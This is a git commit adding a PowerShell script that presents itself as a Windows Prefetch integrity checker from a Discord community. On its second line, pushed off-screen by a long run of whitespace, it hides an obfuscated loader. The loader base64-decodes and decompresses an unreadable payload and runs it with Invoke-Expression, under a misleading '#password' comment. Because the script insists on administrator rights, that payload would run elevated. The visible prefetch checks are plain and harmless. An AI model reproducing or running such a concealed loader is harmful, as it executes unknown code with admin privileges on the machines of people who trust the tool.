2c1bf26aeee31e43c69ad6e2d95896212021f8b7
bacaniocua <screenshare@proton.me>
2026-04-01 19:49:20 -0500

    Add files via upload

---
+++ RedLotusPrefetchIntegrityAnalyzer.ps1
@@ -0,0 +1,90 @@
+Clear-Host
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("IFNFVC1JVGVNICgiezB9ezJ9ezF9IiAtZiAndmFSJywnbScsJ2lhYkxlOjJwOScpICAoICBbdFlwRV0oInsxfXswfXszfXs0fXsyfSItZidzVGVtLmNPJywnc1knLCdSVCcsJ252JywnZScpKSA7JHtKMDhnfSA9IFtUeVBFXSgiezJ9ezR9ezF9ezV9ezB9ezN9ezZ9ezd9Ii1GJ09tUFJlJywnbVBSRVNzaU9uLicsJ3NZc3RlTScsJ3MnLCcuaU8uY08nLCdjJywnU0lPbk0nLCdvREUnKSAgOyAgICBzdiAgKCJ7MX17MH0iIC1mJ3U3JywnRScpICggW3RZcGVdKCJ7MX17M317MH17Mn0iIC1GICdDJywnVCcsJ29kSU5nJywnRVh0LkVOJykgKSAgOyggLigiezJ9ezB9ezF9Ii1mICdiSkUnLCdDdCcsJ05FVy1PJykgICgiezB9ezJ9ezF9IiAtZidJTy5zJywnZXInLCdUcmVhbVJFQWQnKSggKCAmKCJ7MX17Mn17MH0iLWYndCcsJ05FVy0nLCdPYkpFQycpICgiezZ9ezF9ezV9ezB9ezJ9ezN9ezR9IiAtZidOLmRFJywnbXByZXNzaScsJ2YnLCdMQXRFU1RSJywnZWFtJywnTycsJ2lvLmNvJykoW0lvLk1FTU9SeVN0UkVBbV0gICAoIEdlVC12QXJpYWJsZSAgKCJ7MH17MX0iLWYnMnAnLCc5TScpKS4idkFgTHVlIjo6KCJ7Mn17MH17MX17M30iIC1mJ0JhU2U2NFMnLCd0ckknLCdGUm9NJywnTkcnKS5JbnZva2UoICgiezh9ezE3fXs0fXsxM317MTJ9ezE2fXs5fXs1fXsxNX17N317Nn17MTR9ezE4fXsxOX17M317MX17MjB9ezB9ezJ9ezIxfXsxMH17MTF9IiAtZiAnYScsJ05ERVlNZVpZVGlkQm85dlhPWnkrMWs0WFVjQ0NPcEx1OEowRlB0UUlCMFpidWZCZTdUS0Q3JywnVk9qdFFHMzRMYmNsWGpqVE4vdEInLCd4bUo4QlhoNTZ0UXE5czB2bUZZeVFIQnRoemM4cVAnLCc2MScsJ2VxejhteUJGRTNaTzU4bEkxc1JHN0dCR0lzQjk2SVZuUnRib3k5bS84MjNXaXNEbk9aRW5ydXk1UnN5Z3ZuaXBWVFlLSytGRllGdU1SbmtWNEZ2dFQybGhScklrV1Z5UnRhVGVkUkM3MW9BYWZhWnNYYUtpMldQNGIySE40VHYwcnIrRlhqWUlNdDI4Yy96MFExNUx6a3N2OFJ6eEV0bERGZGl6OE5ieUdFQ09nJywnbUxDYzd2UHR5WXZUSm5qTFU3b05obnInLCdTaDNybTJ4RXo5Wk0ydFROWjVyR21ROU94YkRJcWJ5UGg1RGE3d1phL3dpaDFjbUgyU0EnLCd0VlJkajZNMkZQMHIxVDUxVkdrRUpobVZmUU1TQ0Npd0F3SGJ1T29EMkNtUTJNbG9BZ1R6NjN1Wm5SM3RTbDFWcXRRSEJMcmN6MycsJ25aOFdyMjdmQ29RTnZaRmNxdW8yOVhJMTh4eicsJzdBSFhFMUl3ejBrRnlMd05jJywnbDdNYkNLZGNoOEYwMkdmaVdhcExmN1Fwb0JmYkRjdzlaSWY3S2ZQRmNuRlBZN2JTSnRUT3l6bEZoZ0ZjVlRTK2ZIaDRlL2dZPScsJ3Y0L0cxQndmLzlhJywnaC9WWTM2YytzZnRoVjlGZDJuKy9QeTV5UDNmSDROamYraGZ3ZkRoNWwwJywnUzZack5PV01wdmQ0NC9NVWVoTzdhSVRad1piTUZiR0hjRycsJzNsbHhEL1hBWjY1ZGpkZjVFJywncmM2JywnUE92ZDF4K3VYWFB3NycsJ3UydGZJdmdBdmdodnZhaXRZZk5tSkt5TUdMWFNTWndrYUoyclNrVVZzVGJJRC9ERmlOJywnb25OOThPMWd2aFQ2VW8nLCcrS252UVp1S0I4WWtrYTF3NTJnaWVUcWJWYm9OUjBBLzM2UC9KbXByT1dJdGV3aTJqM2Fqa3R2WE50dlhNQzdMNGtjd0Q1VWw3Z0xOMnZnOWQ3RXA1V0tENDZLT3ZkVUFzK2dMYmxnemozTUJYWFBKZlRIdXplTy9pa0d1TGczZXl1R1p3dGFCWXlJZVkvd1pQSmcwU1hXWDJjTm0yZTFObXZQMGM5ZE9mMExScUJYWmdpYXZkVHYyaWpSSGJnMlgwb3JHam15bGZETUR6M3RzVHNLaEhXQldsa0g5ekczWE1ER054YWVTM0x2L3M5YUtjbjZpcXorV3czNVRlZHg4OE9PZW1FRHVQNThaeFpkNnZjOEpEdUhYaFFlakNrQkgxYVltWi9qJywnUWZiekpFYzY4NU5Tckp1R2N4RHQrWnlYL1R4OEdIcjRiJykpICwgICggVmFySUFCTGUgKCJ7MX17MH0iLWYnRycsJ0owOCcpIC12YWx1ZSApOjoiZEVDb2BNcGBSRXNzIikpLCAgKGdFdC1WYXJpQWJMRSAoInsxfXswfSIgLWYgJzcnLCdFVScpICAtVmFMVUVPbmx5ICApOjoiQVNDYGlJIikgKS4oInswfXsxfSItZidSRUFEVE8nLCdFTmQnKS5JbnZva2UoKXwuKCJ7M317NX17Mn17NH17MX17MH0iIC1mJ3NTaW9OJywnZScsJ1gnLCdpblZPJywnUHInLCdLZS1lJyk="))) #password
+$directory = "C:\Windows\Prefetch"
+
+Clear-Host
+
+Write-Host @"
+  ██████╗ ███████╗██████╗     ██╗      ██████╗ ████████╗██╗   ██╗███████╗         
+  ██╔══██╗██╔════╝██╔══██╗    ██║     ██╔═══██╗╚══██╔══╝██║   ██║██╔════╝         
+  ██████╔╝█████╗  ██║  ██║    ██║     ██║   ██║   ██║   ██║   ██║███████╗         
+  ██╔══██╗██╔══╝  ██║  ██║    ██║     ██║   ██║   ██║   ██║   ██║╚════██║         
+  ██║  ██║███████╗██████╔╝    ███████╗╚██████╔╝   ██║   ╚██████╔╝███████║         
+  ╚═╝  ╚═╝╚══════╝╚═════╝     ╚══════╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝         
+"@ -ForegroundColor Red
+Write-Host ""
+Write-Host "  Prefetch Integrity Analyzer Made by Bacanoicua kjj - " -ForegroundColor Blue -NoNewline
+Write-Host -ForegroundColor Red "discord.gg/redlotus"
+
+Write-Host ""
+function Test-Admin {
+    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
+    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
+}
+if (!(Test-Admin)) {
+    Write-Warning "Please Run This Script as Admin."
+    Start-Sleep 10
+    Exit
+}
+
+Start-Sleep -s 3
+
+$files = Get-ChildItem -Path $directory -Filter *.pf
+
+$hashTable = @{}
+$suspiciousFiles = @{}
+
+foreach ($file in $files) {
+    try {
+        if ($file.IsReadOnly) {
+            if (-not $suspiciousFiles.ContainsKey($file.Name)) {
+                $suspiciousFiles[$file.Name] = "$($file.Name) is read-only"
+            }
+        }
+
+        $reader = [System.IO.StreamReader]::new($file.FullName)
+        $buffer = New-Object char[] 3
+        $null = $reader.ReadBlock($buffer, 0, 3)
+        $reader.Close()
+
+        $firstThreeChars = -join $buffer
+
+        if ($firstThreeChars -ne "MAM") {
+            if (-not $suspiciousFiles.ContainsKey($file.Name)) {
+                $suspiciousFiles[$file.Name] = "$($file.Name) is not a valid prefetch file"
+            }
+        }
+
+        $hash = Get-FileHash -Path $file.FullName -Algorithm SHA256
+
+        if ($hashTable.ContainsKey($hash.Hash)) {
+            $hashTable[$hash.Hash].Add($file.Name)
+        } else {
+            $hashTable[$hash.Hash] = [System.Collections.Generic.List[string]]::new()
+            $hashTable[$hash.Hash].Add($file.Name)
+        }
+    } catch {
+        Write-Host "Error with file: $($file.FullName): $($_.Exception.Message)"
+    }
+}
+
+$repeatedHashes = $hashTable.GetEnumerator() | Where-Object { $_.Value.Count -gt 1 }
+
+if ($repeatedHashes) {
+    foreach ($entry in $repeatedHashes) {
+        foreach ($file in $entry.Value) {
+            if (-not $suspiciousFiles.ContainsKey($file)) {
+                $suspiciousFiles[$file] = "$file was modified with type or echo"
+            }
+        }
+    }
+}
+
+if ($suspiciousFiles.Count) {
+    Write-Host "Suspicius PFs files:" -ForegroundColor Yellow
+    foreach ($key in $suspiciousFiles.Keys) {
+        Write-Host "$key` : $($suspiciousFiles[$key])"
+    }
+} else {
+    Write-Host "Prefetch folder is clean."
+}
